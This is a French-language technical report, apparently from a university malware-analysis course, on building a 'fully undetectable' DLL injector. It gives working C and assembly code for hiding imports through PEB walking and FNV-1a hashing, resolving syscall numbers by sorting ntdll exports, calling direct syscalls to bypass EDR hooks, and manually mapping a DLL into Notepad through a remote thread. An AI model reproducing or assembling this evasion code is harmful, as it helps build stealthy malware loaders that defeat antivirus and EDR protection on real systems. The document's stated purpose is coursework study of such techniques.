# Rapport Technique — Injecteur FUD Hybride (Direct Syscalls + PEB Walk)

> **Contexte :** Projet réalisé dans le cadre d'un cours d'analyse de malwares à l'université.
> **Objectif pédagogique :** Comprendre les mécanismes d'injection de DLL furtifs en implémentant
> une architecture combinant la résolution dynamique d'API via le PEB et l'exécution de syscalls
> directs via la résolution dynamique des SSN par tri de l'EAT.

---

## 1. Techniques Employées — Architecture Hybride FUD

### 1.1 PEB Walk + Hachage FNV-1a (résolution d'API sans IAT)

La première couche de furtivité consiste à ne jamais importer explicitement les fonctions Windows
sensibles (`OpenProcess`, `VirtualAllocEx`, `CreateRemoteThread`, etc.). En temps normal, ces
importations apparaissent en clair dans la table IAT (*Import Address Table*) du binaire, ce qui
déclenche des alertes statiques dans les EDR et les antivirus.

**Mécanisme :** Au démarrage, le code parcourt la structure `PEB_LDR_DATA` accessible via le
registre `gs:[0x60]` (offset du PEB sur x86-64) pour énumérer les modules chargés, puis analyse
leur EAT pour retrouver les fonctions par leur hash FNV-1a plutôt que par leur nom en clair.

```c
// Accès au PEB depuis le TEB via le registre gs
PEB* pPeb = (PEB*)__readgsqword(0x60);
PMY_PEB_LDR_DATA pLdr = (PMY_PEB_LDR_DATA)pPeb->Ldr;

// Parcours de InMemoryOrderModuleList
LIST_ENTRY* pHead    = &pLdr->InMemoryOrderModuleList;
LIST_ENTRY* pCurrent = pHead->Flink;

while(pCurrent != pHead){
    PMY_LDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
        pCurrent, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks
    );
    // Comparaison par hash FNV-1a du nom (insensible à la casse)
    if(HashStringFNV1aW(pEntry->BaseDllName.Buffer) == moduleHash)
        return (HMODULE)pEntry->DllBase;

    pCurrent = pCurrent->Flink;
}
```

**Algorithme de hachage FNV-1a 32 bits :**

```c
#define FNV1A_OFFSET_BASIS  2166136261U  // 0x811C9DC5
#define FNV1A_PRIME         16777619U    // 0x01000193

DWORD HashStringFNV1a(const char* str){
    DWORD hash = FNV1A_OFFSET_BASIS;
    while(*str){
        hash ^= (DWORD)(unsigned char)*str;
        hash *= FNV1A_PRIME;
        str++;
    }
    return hash;
}
```

Les hashes des noms de fonctions sont précalculés et stockés comme constantes :

```c
#define HASH_NtOpenProcess            0x5EA49A38U
#define HASH_NtAllocateVirtualMemory  0xCA67B978U
#define HASH_NtWriteVirtualMemory     0x43E32F32U
#define HASH_NtCreateThreadEx         0xED0594DAU
```

---

### 1.2 Résolution dynamique des SSN par tri de l'EAT — Approche FreshyCalls

La deuxième couche de furtivité contourne les *hooks* userland des EDR. Les EDR modernes
remplacent les premières instructions des fonctions `Nt*` de ntdll par des sauts vers leur moteur
d'analyse. En passant directement par l'instruction `syscall` du processeur, on court-circuite
totalement ce mécanisme.

**Problème :** Les numéros de syscall (SSN) varient d'une version de Windows à une autre.
Les injecteurs naïfs les codent en dur, ce qui les rend fragiles et détectables par signature.

**Solution — FreshyCalls :** Les stubs `Zw*` et `Nt*` de ntdll sont des miroirs fonctionnels.
Windows leur attribue des SSN consécutifs, et leurs adresses en mémoire suivent exactement
l'ordre de leur SSN. Il suffit donc de trier toutes les exportations `Zw*` par adresse pour
retrouver dynamiquement leur SSN à l'exécution.

```
Adresse de ZwAllocateVirtualMemory (SSN=24) < Adresse de ZwClose (SSN=15) ?
→ Non : après tri, l'index dans le tableau trié correspond au SSN.
```

**Implémentation :**

```c
// 1. Collecte des exportations Zw* depuis l'EAT de ntdll
for(DWORD i = 0; i < pExports->NumberOfNames; i++){
    const char* name = (const char*)(pBase + pAddressOfNames[i]);
    if(name[0] == 'Z' && name[1] == 'w'){
        g_SyscallTable[g_SyscallCount].hash    = HashZwToNt(name); // hash Nt*
        g_SyscallTable[g_SyscallCount].address = pBase + funcRva;
        g_SyscallCount++;
    }
}

// 2. Tri par adresse croissante (tri par insertion, sans dépendance CRT)
SortSyscallEntries(g_SyscallTable, g_SyscallCount);

// 3. L'index trié = SSN
for(DWORD i = 0; i < g_SyscallCount; i++)
    g_SyscallTable[i].ssn = i;
```

**Stub ASM générique :** Un unique stub en assemblage remplace les stubs ntdll individuels.
`SetSSN()` configure le numéro du syscall à exécuter, puis `RunSyscall()` l'exécute :

```nasm
; syscall-stub.nasm
section .data
g_current_ssn: dd 0

section .text

SetSSN:                             ; void SetSSN(DWORD ssn)  → rcx = ssn
    mov dword [rel g_current_ssn], ecx
    ret

RunSyscall:                         ; mimique le stub ntdll
    mov r10, rcx                    ; convention syscall Windows x64
    mov eax, dword [rel g_current_ssn]
    syscall
    ret
```

---

## 2. Subtilités d'Implémentation — NTAPI vs WinAPI

Le passage des appels WinAPI (`OpenProcess`, `VirtualAllocEx`) aux appels NTAPI
(`NtOpenProcess`, `NtAllocateVirtualMemory`) implique plusieurs différences critiques.

### 2.1 Structures d'entrée obligatoires

`NtOpenProcess` n'accepte pas un simple PID : il exige deux structures noyau correctement
initialisées, `OBJECT_ATTRIBUTES` et `CLIENT_ID`.

| WinAPI | NTAPI |
|--------|-------|
| `OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)` | `NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid)` |

```c
// WinAPI — simple
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

// NTAPI — structures explicites
OBJECT_ATTRIBUTES oa;
memset(&oa, 0, sizeof(oa));     // Champs réservés à zéro (OBLIGATOIRE)
oa.Length = sizeof(oa);

CLIENT_ID cid;
memset(&cid, 0, sizeof(cid));
cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;

NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
```

### 2.2 Tailles passées par pointeur (PSIZE_T)

`NtAllocateVirtualMemory` prend `PSIZE_T` (pointeur) là où `VirtualAllocEx` prenait
`SIZE_T` (valeur). Le noyau met à jour la taille effectivement allouée après l'appel.

```c
// WinAPI — taille passée par valeur
LPVOID p = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

// NTAPI — taille passée par pointeur (in/out)
PVOID  pRemote     = NULL;
SIZE_T regionSize  = 0x1000;
NtAllocateVirtualMemory(hProcess, &pRemote, 0, &regionSize,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

### 2.3 NTSTATUS au lieu de GetLastError()

Les fonctions NTAPI retournent un `NTSTATUS` (32 bits signé). La valeur `0x00000000`
(`STATUS_SUCCESS`) indique le succès ; toute valeur négative ou non nulle indique une erreur.
`GetLastError()` n'est pas pertinent ici.

```c
// WinAPI
HANDLE h = OpenProcess(...);
if(h == NULL){
    DWORD err = GetLastError(); // consultation de l'état TLS
}

// NTAPI
NTSTATUS status = NtOpenProcess(&h, ...);
if(status != 0){                         // STATUS_SUCCESS == 0
    // status contient le code d'erreur NT (ex. 0xC0000005 = ACCESS_DENIED)
}
```

---

## 3. Bugs et Pièges Rencontrés

### 3.1 Le piège de l'allocation mémoire — pointeur non initialisé

**Symptôme :** WerFault / Access Violation dès le premier appel à `NtAllocateVirtualMemory`.

**Cause :** `NtAllocateVirtualMemory` reçoit un `PVOID*` (pointeur vers le pointeur de base).
Si ce pointeur n'est pas initialisé à `NULL`, le noyau interprète la valeur arbitraire présente
sur la pile comme une *adresse de base souhaitée* pour l'allocation. Si cette adresse est
invalide ou appartient à une région déjà occupée, le noyau retourne `STATUS_INVALID_PARAMETER`
ou, pire, tente d'accéder à une zone mémoire non mappée.

```c
// INCORRECT — valeur indéterminée sur la pile
PVOID pRemote;
NtAllocateVirtualMemory(hProcess, &pRemote, ...); // pRemote = 0xCDCDCDCD → crash

// CORRECT — NULL signifie « choisir librement l'adresse »
PVOID pRemote = NULL;
NtAllocateVirtualMemory(hProcess, &pRemote, ...); // le noyau choisit l'adresse
```

**Règle :** Tout pointeur passé comme paramètre `BaseAddress` à une fonction d'allocation NTAPI
**doit** être explicitement initialisé à `NULL` avant l'appel.

---

### 3.2 Le piège du linker C/ASM — `extern void*` vs `extern void fn(void)`

**Symptôme :** Access Violation lors du premier appel à un wrapper `d*`, **avant même**
d'atteindre l'instruction `syscall`. La valeur appelée ressemble à `0x00CA894C` ou similaire.

**Cause :** La confusion entre un *symbole de données* et un *symbole de code* dans la liaison
C/ASM.

Dans `syscall-stub.nasm`, `RunSyscall` est un **label de code** — son adresse pointe sur les
premières instructions de la fonction. En C, la déclaration `extern` détermine comment le
compilateur interprète ce symbole :

```
Mémoire à l'adresse du label RunSyscall :
┌─────────────────────────────────────────────────────────┐
│ 4C 89 CA  │ 8B 05 xx xx xx xx  │ 0F 05  │ C3          │
│ mov r10,rcx│ mov eax,[g_ssn]    │ syscall│ ret         │
└─────────────────────────────────────────────────────────┘
  ↑ adresse du label RunSyscall
```

**Avec `extern void* RunSyscall` (déclaration incorrecte) :**

Le compilateur C traite `RunSyscall` comme une **variable** de type `void*`. L'expression
`RunSyscall` produit le code : *lire 8 octets à l'adresse du label*. Ce qui est lu sont les
premiers octets de la fonction (`4C 89 CA 8B 05 ...`), interprétés comme un pointeur 64 bits —
soit une adresse aléatoire invalide. Appeler ce pointeur provoque une Access Violation.

```c
// INCORRECT
extern void* RunSyscall;

typedef NTSTATUS (NTAPI *fn)(HANDLE, PVOID*, ...);
((fn)RunSyscall)(...);
// → le compilateur émet : CALL [adresse_de_RunSyscall]
// → charge les opcodes de la fonction comme pointeur → 0x8B_CA_89_4C (garbage)
// → CRASH
```

**Avec `extern void RunSyscall(void)` (déclaration correcte) :**

Le compilateur C traite `RunSyscall` comme un **nom de fonction**. En C, un nom de fonction
se *dégrade* naturellement en un pointeur vers son adresse en mémoire — sans déréférencement.
L'expression `RunSyscall` produit directement l'adresse du label, ce qui est exactement ce
que l'on souhaite.

```c
// CORRECT
extern void RunSyscall(void);

typedef NTSTATUS (NTAPI *fn)(HANDLE, PVOID*, ...);
((fn)RunSyscall)(...);
// → le compilateur émet : CALL adresse_de_RunSyscall (appel direct)
// → exécute mov r10,rcx / mov eax,[g_ssn] / syscall / ret
// → SUCCÈS
```

**Résumé de la règle :**

| Déclaration C | Ce que le compilateur lit | Résultat |
|---|---|---|
| `extern void* RunSyscall;` | Les 8 octets stockés **à** l'adresse du label | Opcodes interprétés comme pointeur → garbage |
| `extern void RunSyscall(void);` | **L'adresse** du label (dégradation de fonction) | Adresse correcte du stub → succès |

---

## 4. Architecture des Fichiers

```
dll-injector/
├── src/
│   ├── main.c                  — Point d'entrée, initialisation, recherche du PID
│   ├── dll-injector.c          — Orchestration de l'injection (mapping, stubs, thread)
│   ├── pe-parser.c             — Validation et lecture du fichier PE
│   ├── loader-stub.c           — Stub C exécuté dans le processus cible (reloc, IAT, DllMain)
│   ├── asm-stub.nasm           — Stub ASM shellcode (PEB walk, résolution API, appel stub C)
│   ├── syscall-stub.nasm       — Stub ASM générique (SetSSN + RunSyscall)
│   └── utils/
│       ├── peb-lookup.c        — Résolution d'API par PEB walk + hash FNV-1a
│       └── syscalls.c          — Résolution des SSN par tri EAT + wrappers d*
├── include/
│   ├── utils/
│   │   ├── peb-lookup.h        — Structures PEB, hashes, prototypes de résolution
│   │   ├── direct-syscalls.h   — Structures NTAPI (OBJECT_ATTRIBUTES, CLIENT_ID), prototypes d*
│   │   └── syscalls.h          — Table SYSCALL_ENTRY, hashes Nt*, prototypes Init/GetSSN
│   └── dll-injector/
│       ├── dll-injector.h      — MANUAL_MAPPING_DATA, prototypes d'injection
│       └── loader-stub.h       — Prototype et marqueur de fin du stub C
└── notes/
    └── rapport_technique.md    — Ce document
```

---

## 5. Flux d'Exécution Complet

```
main()
 ├─ InitDynamicAPIs()        → PEB walk → résolution kernel32 → peuplement de g_Api
 ├─ InitSyscalls()           → PEB walk → EAT ntdll → tri Zw* → table g_SyscallTable
 ├─ ProcessWalking()         → Toolhelp32 (via g_Api) → PID de Notepad.exe
 └─ injectDll()
     ├─ dOpenProcess()       → NtOpenProcess via syscall direct → handle hProcess
     ├─ MannualMappingDll()
     │   ├─ dAllocateVirtualMemory()  → alloue SizeOfImage octets dans la cible
     │   ├─ dWriteVirtualMemory()     → copie les en-têtes PE
     │   └─ dWriteVirtualMemory() ×N → copie chaque section
     └─ injectManualMappingStub()
         ├─ dAllocateVirtualMemory()  → alloue [stub ASM | stub C | MAPPING_DATA]
         ├─ dWriteVirtualMemory() ×3  → écrit les trois composants
         └─ dCreateThreadEx()         → crée le thread distant → point d'entrée : stub ASM
                                           └─ stub ASM résout LoadLibraryA / GetProcAddress
                                               └─ stub C : relocations + IAT + DllMain()
```
